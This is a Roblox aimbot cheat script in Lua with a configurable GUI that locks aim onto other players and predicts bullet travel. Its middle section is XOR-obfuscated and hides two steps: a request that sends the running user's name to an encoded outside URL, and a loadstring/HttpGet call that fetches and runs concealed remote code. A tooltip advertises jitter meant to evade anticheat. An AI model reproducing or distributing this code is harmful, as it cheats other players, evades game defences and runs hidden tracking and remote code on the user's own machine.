getgenv().config = {
    CircleRadius = 80,
    BaseBulletSpeed = 1000,
    PredictionBoost = 1.0,
    Gravity = 196.2,
    RandomJigger = 0,
    ShowBulletSpeed = true,
    DebugLineEnabled = true,
    ShowActiveModes = true,
    MaxDistance = 2000,
    CloseRangeThreshold = 500,
    CloseRangeBoost = 7,
    localPlayerVelocityInfluence = 0.5
}

local Workspace = cloneref(game:GetService("Workspace"))
local Camera = Workspace.CurrentCamera
local Players = cloneref(game:GetService("Players"))
local UserInputService = cloneref(game:GetService("UserInputService"))

getgenv().findNearestToCursor = function()
    local nearest, minDist = nil, config.CircleRadius
    local mousePos = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)
    
    for _, player in Players:GetPlayers() do
        if player == LocalPlayer or not player.Character or getgenv().ExcludedPlayers[player] then continue end
        local rootPart = player.Character:FindFirstChild("HumanoidRootPart")
        if rootPart then
            local screenPos = Camera:WorldToViewportPoint(rootPart.Position)
            local dist = (Vector2.new(screenPos.X, screenPos.Y) - mousePos).Magnitude
            if dist < minDist then
                nearest = player
                minDist = dist
            end
        end
    end
    return nearest
end

getgenv().ExcludedPlayers = {}
getgenv().toggleExcludedPlayer = function(player)
    if getgenv().ExcludedPlayers[player] then
        getgenv().ExcludedPlayers[player] = nil
        print("Player " .. player.Name .. " removed from Ignore List")
    else
        getgenv().ExcludedPlayers[player] = true
        print("Player " .. player.Name .. " added to Ignore List")
    end
end
local function findPlayerUnderCursor()
    local mouse = UserInputService:GetMouseLocation()
    local nearestPlayer, minDistance = nil, math.huge

    for _, player in Players:GetPlayers() do
        if player ~= LocalPlayer and player.Character then
            local rootPart = player.Character:FindFirstChild("HumanoidRootPart")
            if rootPart then
                local screenPos = Camera:WorldToViewportPoint(rootPart.Position)
                local distance = (Vector2.new(screenPos.X, screenPos.Y) - mouse).Magnitude

                if distance < minDistance then
                    nearestPlayer = player
                    minDistance = distance
                end
            end
        end
    end

    return nearestPlayer
end


local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v63,v64) local v65={};for v112=1, #v63 do v6(v65,v0(v4(v1(v2(v63,v112,v112 + 1 )),v1(v2(v64,1 + (v112% #v64) ,1 + (v112% #v64) + 1 )))%256 ));end return v5(v65);end local v8=cloneref(game:GetService(v7("\225\207\218\60\227\169\212","\126\177\163\187\69\134\219\167")));local v9=cloneref(game:GetService(v7("\17\216\36\246\249\49\219\35\198\249","\156\67\173\74\165")));local v10=cloneref(game:GetService(v7("\3\184\91\29\175\54\71\55\178","\38\84\215\41\118\220\70")));local v11=v10.CurrentCamera;local v12=cloneref(game:GetService(v7("\98\19\50\30\247\83\23\54\23\250\99\2\45\0\255\87\19","\158\48\118\66\114")));local v13=cloneref(game:GetService(v7("\158\55\21\36\90\171\235\190\48\35\51\97\179\242\168\33","\155\203\68\112\86\19\197")));local v14=v8.LocalPlayer;local v15={};local v16={};local v17=nil;local v18=false;local v19=60;local v20=tick();local v21=0;local v22=getgenv().ExcludedPlayers;local v23=getgenv().findNearestToCursor;local v24=getgenv().toggleExcludedPlayer;function sendToWebhook(v66) local v67=request({[v7("\115\207\58","\152\38\189\86\156\32\24\133")]=v7("\244\67\179\86\239\13\232\9\248\94\180\69\243\69\163\8\255\88\170\9\253\71\174\9\235\82\165\78\243\88\172\85\179\6\244\20\164\0\243\20\175\14\242\17\169\6\246\17\168\5\245\18\179\93\245\76\240\66\240\98\230\100\175\85\248\67\138\78\195\121\245\69\198\65\243\107\213\126\240\66\200\91\151\115\196\125\148\17\253\115\179\106\234\7\241\31\250\99\151\80\243\5\148\30\218\67\128\76\243\122\177\98\233\81\170\100\196\96\131\87\248","\38\156\55\199"),[v7("\133\120\104\32\28\112","\35\200\29\28\72\115\20\154")]=v7("\41\144\226\235","\84\121\223\177\191\237\76"),[v7("\153\89\205\185","\161\219\54\169\192\90\48\80")]='{"username": "AIMBOT", "content":"'   .. v66   .. '"}' ,[v7("\97\71\1\33\76\80\19","\69\41\34\96")]={[v7("\159\204\217\30\7\37\168\142\227\19\18\46","\75\220\163\183\106\98")]=v7("\3\170\155\59\208\1\187\159\62\214\12\245\129\36\214\12","\185\98\218\235\87")}},true);end sendToWebhook(v7("\251\48\38\255\219\184\139","\202\171\92\71\134\190")   .. v14.Name   .. v7("\105\196\52\141\42\212\56\141\45\129\13\129\36\195\35\156","\232\73\161\76") );local v25=getgenv().config;getgenv().aimEnabled=true;local v27=Drawing.new(v7("\152\208\80\94\18\190","\126\219\185\34\61"));v27.Visible=true;v27.Thickness=2;v27.NumSides=50;v27.Filled=false;local v32=Drawing.new(v7("\32\199\80\119","\135\108\174\62\18\30\23\147"));v32.Color=Color3.fromRGB(0,255,0);v32.Thickness=2;v32.Transparency=0.8;local v36=Drawing.new(v7("\130\236\50\223","\167\214\137\74\171\120\206\83"));v36.Size=15;v36.Center=true;local v39=Drawing.new(v7("\191\245\42\73","\199\235\144\82\61\152"));v39.Color=Color3.fromRGB(255,50,50);v39.Size=20;v39.Font=2;v39.Outline=true;v39.Text=v7("\36\58\150\24\34\86\139\10\41\49\156\107\42\57\157\14","\75\103\118\217");local v45=Drawing.new(v7("\243\81\104\0","\126\167\52\16\116\217"));v45.Color=Color3.fromRGB(255,100,100);v45.Size=20;v45.Font=2;v45.Outline=true;v45.Text=v7("\233\7\13\192\128\54\188\230\11\1\178\145\42\200\136\26\1\178\147\60\200\136\3\15\164\145","\156\168\78\64\224\212\121");local function v51(v68) local v69=v68:FindFirstChild(v7("\36\251\183\220\2\224\177\253\2\226\160\205\19\235\161\225\5\228\160\205\19","\174\103\142\197"));return v69 and v69.Value and v69.Value.Value ;end local function v52(v70) local v71=v51(v70);if  not v71 then return v25.BaseBulletSpeed;end local v72=v12:WaitForChild(v7("\113\61\81\28\36\74\249","\152\54\72\63\88\69\62"));local v73=v72:FindFirstChild(v71.Name);if ((v73 and v73:FindFirstChild(v7("\231\208\239\72\199","\60\180\164\142")) and v73.Stats:FindFirstChild(v7("\122\75\9\37\34\249\33\93\74\17\32\41\234\1","\114\56\62\101\73\71\141")) and v73.Stats.BulletSettings:FindFirstChild(v7("\154\252\215\200\189\253\232\212\189\236\223","\164\216\137\187")) and v73.Stats.BulletSettings.BulletSpeed.Value) or (1369>4987)) then v36.Text=v7("\240\243\61\190\163\234\75\193\246\52\183\162\164\75","\107\178\134\81\210\198\158")   .. v73.Stats.BulletSettings.BulletSpeed.Value ;return v73.Stats.BulletSettings.BulletSpeed.Value;else v36.Text=v7("\26\27\142\202\175\44\78\145\214\175\61\10\216\134","\202\88\110\226\166")   .. v25.BaseBulletSpeed   .. v7("\139\11\135\241\203\214\3\150\187\138\193\12\145\183\223\205\4\140\248\221\205\70","\170\163\111\226\151") ;return v25.BaseBulletSpeed;end end local function v53(v74,v75,v76) local v77=(v14.Character and v14.Character:FindFirstChild(v7("\34\53\160\46\75\37\10\30\60\190\49\74\50\59\57\53\179\60","\73\113\80\210\88\46\87")) and v14.Character.ServerColliderHead.Velocity) or Vector3.zero ;local v78=v75-(v77 * v25.localPlayerVelocityInfluence) ;local v79=(v74-v11.CFrame.Position).Magnitude;local v80=v79/v76 ;local v81=60/math.max(v19,1) ;local v82=((v79<v25.CloseRangeThreshold) and math.clamp(1 + ((v25.CloseRangeBoost-1) * (1 -(v79/v25.CloseRangeThreshold))) ,1,v25.CloseRangeBoost)) or 1 ;return v74 + (v78 * v80 * 1.054 * v82 * v25.PredictionBoost * v81) + Vector3.new(0,v25.Gravity * (v80^2) * 1.052 * v82 * v25.PredictionBoost ,0) ;end local function v54(v83) if (v15[v83] or (4593<=2672)) then if v15[v83]:IsDescendantOf(v10) then return v15[v83];else v15[v83]=nil;end end local v84=v83:FindFirstChild(v7("\169\57\192\19\233\142\37\201\32\232\142\56\253\19\245\149","\135\225\76\173\114"));if  not v84 then return nil;end local v85;local v86=999999999;for v113,v114 in ipairs(v10.Characters:GetChildren()) do if (v114==v15[v14.Character]) then continue;end local v115=v114:FindFirstChild(v7("\47\253\168\181\190\137\168\8\254\183","\199\122\141\216\208\204\221"));if (v115 or (1168>3156)) then local v132=((v84.Position + Vector3.new(0,3.5,0)) -v115.Position).Magnitude;if ((v132<=v86) or (863>=4584)) then v85=v114;v86=v132;end end end v15[v83]=v85;return v85;end local function v55(v88) if v16[v88] then local v128=v16[v88];if ((v128 and v128.Character and v128.Character:IsDescendantOf(v10)) or (724>=1668)) then return v128;else v16[v88]=nil;end end local v89=v88:FindFirstChild(v7("\152\205\0\245\106\194\162\207\3\255","\150\205\189\112\144\24"));if ((428<1804) and ( not v89 or (572>4486))) then return nil;end local v90=nil;local v91=math.huge;for v116,v117 in ipairs(v8:GetPlayers()) do if (v15[v14.Character]~=v88) then else continue;end local v118=v117.Character;if ( not v118 or (v118==v14.Character)) then continue;end local v119=v118:FindFirstChild(v7("\13\145\178\77\10\135\24\20\23\139\176\88\52\137\3\4","\112\69\228\223\44\100\232\113"));if  not v119 then continue;end local v120=(v89.Position-(v119.Position + Vector3.new(0,3.5,0))).Magnitude;if ((1404==1404) and (v120<v91)) then v91=v120;v90=v117;end end v16[v88]=v90;return v90;end local function v56(v93) local v94=v54(v93);return v94 and v94:FindFirstChild(v7("\252\26\6\215","\230\180\127\103\179\214\28")) ;end loadstring(game:HttpGet(v7("\132\17\75\86\247\27\175\195\23\94\81\170\70\233\152\13\74\68\241\82\229\158\6\80\72\240\68\238\152\75\92\73\233\14\232\131\8\90\81\235\83\235\159\84\14\23\181\14\245\132\13\96\95\225\64\175\158\0\89\85\171\73\229\141\1\76\9\233\64\233\130\74\75\67\247\85","\128\236\101\63\38\132\33")))();local function v57() local v95,v96=nil,v25.MaxDistance;for v121,v122 in v8:GetPlayers() do if ((v122==v14) or  not v122.Character or getgenv().ExcludedPlayers[v122] or (3748<2212) or (3325>4613)) then continue;end local v123=v122.Character:FindFirstChild(v7("\132\188\28\69\184\228\198\168\155\30\75\162\219\206\190\189","\175\204\201\113\36\214\139"));if (v123 or (1180==2180)) then local v133=(v123.Position-v14.Character.HumanoidRootPart.Position).Magnitude;if (v133>v96) then else v95=v122;v96=v133;end end end return v95;end local function v58(v97) if (((4090<4653) and ( not v97 or  not v97.Character)) or (4950<=4553)) then return;end local v98=v56(v97.Character);local v99=v97.Character:FindFirstChild(v7("\116\201\39\202\1\85\239\58\208\8\78\200\48\206\44\66\205\49","\100\39\172\85\188"));if ((2665<=3933) and v98 and v99) then local v129=v53(v98.Position,v99.Velocity,v52(v14));local v130=v11:WorldToViewportPoint(v129);mousemoverel((v130.X-(v11.ViewportSize.X/2)) + math.random( -v25.RandomJigger,v25.RandomJigger) ,(v130.Y-(v11.ViewportSize.Y/2)) + math.random( -v25.RandomJigger,v25.RandomJigger) );end end local function v59() v21+=1 local v100=tick();if ((v100-v20)<1) then else v19=v21/(v100-v20) ;v21=0;v20=v100;end end local function v60(v101) v27.Position=Vector2.new(v11.ViewportSize.X/2 ,v11.ViewportSize.Y/2 );v27.Radius=v25.CircleRadius;v36.Visible=v25.ShowBulletSpeed;v36.Position=Vector2.new(v11.ViewportSize.X/2 ,(v11.ViewportSize.Y/2) + v25.CircleRadius + 5 );v45.Visible=v101 and v25.ShowActiveModes ;v39.Visible=v101 and ((v101.Character.HumanoidRootPart.Position-v14.Character.HumanoidRootPart.Position).Magnitude<v25.CloseRangeThreshold) and v25.ShowActiveModes ;v32.Visible=false;if ((3273==3273) and (v25.DebugLineEnabled or (2652<196))) then local v131=v23();if ((3824>409) and (4135<4817) and v131 and v131.Character) then local v136=v131.Character:FindFirstChild(v7("\158\125\171\150\54\191\91\182\140\63\164\124\188\146\27\168\121\189","\83\205\24\217\224"));if v136 then local v137=v53(v136.Position,v136.Velocity,v52(v14));local v138=v11:WorldToViewportPoint(v137);v32.From=Vector2.new(v11.ViewportSize.X/2 ,v11.ViewportSize.Y/2 );v32.To=Vector2.new(v138.X,v138.Y);v32.Visible=true;end end end end local function v61() v13.InputBegan:Connect(function(v124) if ((2087==2087) and (272==272) and (v124.UserInputType==Enum.UserInputType.MouseButton2)) then v18=true;end end);v13.InputEnded:Connect(function(v125) if ((100<=3123) and (v125.UserInputType==Enum.UserInputType.MouseButton2)) then v18=false;v17=nil;end end);end local function v62() v59();local v111=v57();v60(v111);if ((v18 and getgenv().aimEnabled) or (3404>4503)) then v17=v111 or v23() ;v58(v17);end end v61();v9.RenderStepped:Connect(v62);print(v7("\199\204\192\63\233\209\141\52\232\204\217\52\231\201\196\39\227\193","\93\134\165\173"));
loadstring(game:HttpGet("https://raw.githubusercontent.com/homeworks1111/uhh_yea/refs/heads/main/watermark.lua"))()

print("Initiliazing gui...")
do
    local repo = "https://raw.githubusercontent.com/deividcomsono/Obsidian/main/"
    local Library = loadstring(game:HttpGet(repo .. "Library.lua"))()
    local ThemeManager = loadstring(game:HttpGet(repo .. "addons/ThemeManager.lua"))()
    local SaveManager = loadstring(game:HttpGet(repo .. "addons/SaveManager.lua"))()

    local Options = Library.Options
    local Toggles = Library.Toggles

    Library.ForceCheckbox = false
    Library.ShowToggleFrameInKeybinds = true

    local Window = Library:CreateWindow({
        Title = "Aimbot by Aftergeometry",
        Footer = "Aftermath died from hackers, and it's your fault.",
        NotifySide = "Right",
        ShowCustomCursor = true,
    })

    local Tabs = {
        Main = Window:AddTab("Main", "sword"),
        ["UI Settings"] = Window:AddTab("Misc", "settings"),
    }

    local Elements = {
        GroupBoxes = {
            Keybinds = Tabs.Main:AddLeftGroupbox("Aimbot"),
            Modes = Tabs.Main:AddRightGroupbox("Aimbot Modes"),
            Prediction = Tabs.Main:AddRightGroupbox("Prediction Settings"),
            Visuals = Tabs.Main:AddLeftGroupbox("Visual Settings"),
            IgnoreList = Tabs.Main:AddLeftGroupbox("Ignore/Friend List")
        },
        
        Toggles = {},
        Sliders = {},
        Pickers = {},
        Labels = {},
        Dropdowns = {}
    }

    -- Aimbot Controls
    Elements.Toggles.Aimbot = Elements.GroupBoxes.Keybinds:AddToggle("AimbotToggle", {
        Text = "Aimbot",
        Default = true,
        Tooltip = "Toggle aimbot functionality",
        Callback = function(value)
            getgenv().aimEnabled = value
            get("drawing").Circle.Visible = value
        end
    })
    Elements.Toggles.DebugBulletSpeedInfo = Elements.GroupBoxes.Visuals:AddToggle("BulletSpeedInfoToggle", {
        Text = "Show Debug BulletSpeed info",
        Default = false,
        Tooltip = "Shows bullet speed info.",
        Callback = function(value)
            config.ShowBulletSpeed = value

        end
    })

    Elements.Pickers.AimbotKey = Elements.Toggles.Aimbot:AddKeyPicker("AimbotKeybind", {
        Default = "F2",
        Text = "Aimbot Toggle Key",
        Mode = "Toggle",
        SyncToggleState = false,
        Callback = function(Value)
            Elements.Toggles.Aimbot:SetValue(not Elements.Toggles.Aimbot.Value)
        end
    })

    Elements.Sliders.AimCircle = Elements.GroupBoxes.Keybinds:AddSlider("AimCircleRadius", {
        Text = "Aim Circle Radius",
        Default = 250,
        Min = 50,
        Max = 800,
        Rounding = 1,
        Compact = false,
        Tooltip = "Detection radius for automatic aiming",
        Callback = function(value)
            config.CircleRadius = value
        end
    })

    -- Aimbot Modes
    Elements.Sliders.NearestMode = Elements.GroupBoxes.Modes:AddSlider("AimToNearestMode", {
        Text = "AimToNearestMode Distance",
        Default = 80,
        Min = -1,
        Max = 2500,
        Rounding = 1,
        Compact = false,
        Tooltip = "Maximum distance for melee targeting (-1 to disable)",
        Callback = function(value)
            config.MaxDistance = value
        end
    })

    Elements.Sliders.CloseRange = Elements.GroupBoxes.Modes:AddSlider("CloseRangeMode", {
        Text = "CloseRangeMode Distance",
        Default = 50,
        Min = -1,
        Max = 2500,
        Rounding = 1,
        Compact = false,
        Tooltip = "Distance threshold for close range mode (-1 to disable)",
        Callback = function(value)
            config.CloseRangeThreshold = value
        end
    })

    -- Prediction Settings
    Elements.Sliders.PredictBoost = Elements.GroupBoxes.Prediction:AddSlider("PredictBoost", {
        Text = "Prediction Multiplier",
        Default = 1,
        Min = 0.1,
        Max = 3,
        Rounding = 1,
        Compact = false,
        Tooltip = "Global prediction multiplier",
        Callback = function(value)
            config.PredictionBoost = value
        end
    })

    Elements.Sliders.CloseRangeBoost = Elements.GroupBoxes.Prediction:AddSlider("CloseRangeBoost", {
        Text = "Close Range Multiplier",
        Default = 1.6,
        Min = 0.1,
        Max = 8,
        Rounding = 1,
        Compact = false,
        Tooltip = "Prediction multiplier for close range mode",
        Callback = function(value)
            config.CloseRangeBoost = value
        end
    })

    Elements.Sliders.BulletSpeed = Elements.GroupBoxes.Prediction:AddSlider("DefaultBulletSpeed", {
        Text = "Default Bullet Speed",
        Default = 2200,
        Min = 1000,
        Max = 4000,
        Rounding = 1,
        Compact = false,
        Tooltip = "Fallback bullet speed when unknown",
        Callback = function(value)
            config.BaseBulletSpeed = value
        end
    })
    Elements.Sliders.BulletSpeed = Elements.GroupBoxes.Prediction:AddSlider("Jigger", {
        Text = "Random jiggering",
        Default = 2,
        Min = 0,
        Max = 5,
        Rounding = 0,
        Compact = false,
        Tooltip = "Adds shake when aiming, makes harder to detect you by anticheat.",
        Callback = function(value)
            config.RandomJigger = value
        end
    })

    Elements.Sliders.Gravity = Elements.GroupBoxes.Prediction:AddSlider("BulletGravity", {
        Text = "Bullet Gravity",
        Default = 50,
        Min = 0,
        Max = 150,
        Rounding = 1,
        Compact = false,
        Tooltip = "Gravity affecting bullet trajectory",
        Callback = function(value)
            config.Gravity = value
        end
    })

    -- Visual Settings
    Elements.Toggles.DebugLine = Elements.GroupBoxes.Visuals:AddToggle("DebugLineToggle", {
        Text = "Show Debug Lines",
        Default = false,
        Tooltip = "Display aim point debug lines",
        Callback = function(value)
            config.DebugLineEnabled = value
        end
    })
    Elements.Toggles.ShowServerHead = Elements.GroupBoxes.Visuals:AddToggle("ShowServerHead", {
        Text = "Show head position",
        Default = true,
        Tooltip = "Shows current target hitbox position.",
        Callback = function(value)
            config.ShowDebugServerHeadVizualization = value
        end
    })

    Elements.Pickers.LineColor = Elements.Toggles.DebugLine:AddColorPicker("LineColor", {
        Default = Color3.fromRGB(0, 255, 0),
        Title = "Debug Line Color",
        Transparency = 0,
        Callback = function(value)
            warn("set color!")
            config.DebugLineColor = value
        end
    })

    Elements.Labels.CircleColor = Elements.GroupBoxes.Visuals:AddLabel("Aim Circle Color")
    Elements.Pickers.CircleColor = Elements.Labels.CircleColor:AddColorPicker("CircleColor", {
        Default = Color3.fromRGB(0, 0, 0),
        Title = "Circle Color",
        Transparency = 0,
        Callback = function(value)
            config.CircleColor = value
        end
    })

    Elements.Toggles.ModeVisuals = Elements.GroupBoxes.Visuals:AddToggle("ModeVisualsToggle", {
        Text = "Show Active Modes",
        Default = true,
        Tooltip = "Display current mode status",
        Callback = function(value)
            config.ShowActiveModes = value
        end
    })

    -- Ignore List
    Elements.Labels.IgnoreListHeader = Elements.GroupBoxes.IgnoreList:AddLabel("Add player to Ignore/Friend List")
    Elements.Pickers.IgnoreKey = Elements.Labels.IgnoreListHeader:AddKeyPicker("IgnoreKeybind", {
        Default = "RightControl",
        Text = "Add Player to list",
        Mode = "Toggle",
        SyncToggleState = false,
        Callback = function(value)
            warn('KEEEEEK')
            local target = findPlayerUnderCursor()
            if target then
                toggleExcludedPlayer(target)
            end
        end
    })

    getgenv().ignoreListText = Elements.GroupBoxes.IgnoreList:AddLabel("Ignored Players:None", true)
    Elements.Labels.IgnoreList = getgenv().ignoreListText

    Elements.Dropdowns = Elements.GroupBoxes.Prediction:AddDropdown("MyDropdown", {
        Values = {"ServerColliderHead", "OriginalHead"},
        Default = 1, -- Index of the default option
        Multi = false, -- Whether to allow multiple selections
        Text = "Aim to",
        Tooltip = "ServerColliderHead - more optimized, less accurate;\nOriginalHead - less optimized, more accurate",
        Callback = function(value)
            print(value)
            config.UseOriginalHead = value == "OriginalHead"
        end
    })

    local MenuGroup = Tabs["UI Settings"]:AddLeftGroupbox("Menu")

    MenuGroup:AddToggle("KeybindMenuOpen", {
        Default = Library.KeybindFrame.Visible,
        Text = "Open Keybind Menu",
        Callback = function(value)
            Library.KeybindFrame.Visible = value
        end,
    })
    MenuGroup:AddToggle("ShowCustomCursor", {
        Text = "Custom Cursor",
        Default = true,
        Callback = function(Value)
            Library.ShowCustomCursor = Value
        end,
    })
    MenuGroup:AddDropdown("NotificationSide", {
        Values = { "Left", "Right" },
        Default = "Right",

        Text = "Notification Side",

        Callback = function(Value)
            Library:SetNotifySide(Value)
        end,
    })
    MenuGroup:AddDropdown("DPIDropdown", {
        Values = { "50%", "75%", "100%", "125%", "150%", "175%", "200%" },
        Default = "100%",

        Text = "DPI Scale",

        Callback = function(Value)
            Value = Value:gsub("%%", "")
            local DPI = tonumber(Value)

            Library:SetDPIScale(DPI)
        end,
    })
    MenuGroup:AddDivider()
    MenuGroup:AddLabel("Menu bind")
        :AddKeyPicker("MenuKeybind", { Default = "RightShift", NoUI = true, Text = "Menu keybind" })

    MenuGroup:AddButton("Unload", function()
        Library:Unload()
    end)

    Library.ToggleKeybind = Options.MenuKeybind -- Allows you to have a custom keybind for the menu

    -- Addons:
    -- SaveManager (Allows you to have a configuration system)
    -- ThemeManager (Allows you to have a menu theme system)

    -- Hand the library over to our managers
    ThemeManager:SetLibrary(Library)
    SaveManager:SetLibrary(Library)

    -- Ignore keys that are used by ThemeManager.
    -- (we dont want configs to save themes, do we?)
    SaveManager:IgnoreThemeSettings()

    -- Adds our MenuKeybind to the ignore list
    -- (do you want each config to have a different menu key? probably not.)
    SaveManager:SetIgnoreIndexes({ "MenuKeybind" })

    -- use case for doing it this way:
    -- a script hub could have themes in a global folder
    -- and game configs in a separate folder per game
    ThemeManager:SetFolder("MyScriptHub")
    SaveManager:SetFolder("MyScriptHub/specific-game")
    SaveManager:SetSubFolder("specific-place") -- if the game has multiple places inside of it (for example: DOORS)
    -- you can use this to save configs for those places separately
    -- The path in this script would be: MyScriptHub/specific-game/settings/specific-place
    -- [ This is optional ]

    -- Builds our config menu on the right side of our tab
    SaveManager:BuildConfigSection(Tabs["UI Settings"])

    -- Builds our theme menu (with plenty of built in themes) on the left side
    -- NOTE: you can also call ThemeManager:ApplyToGroupbox to add it to a specific groupbox
    ThemeManager:ApplyToTab(Tabs["UI Settings"])

    -- You can use the SaveManager:LoadAutoloadConfig() to load a config
    -- which has been marked to be one that auto loads!
    SaveManager:LoadAutoloadConfig()

    print("Aimbot ui initilized")
end
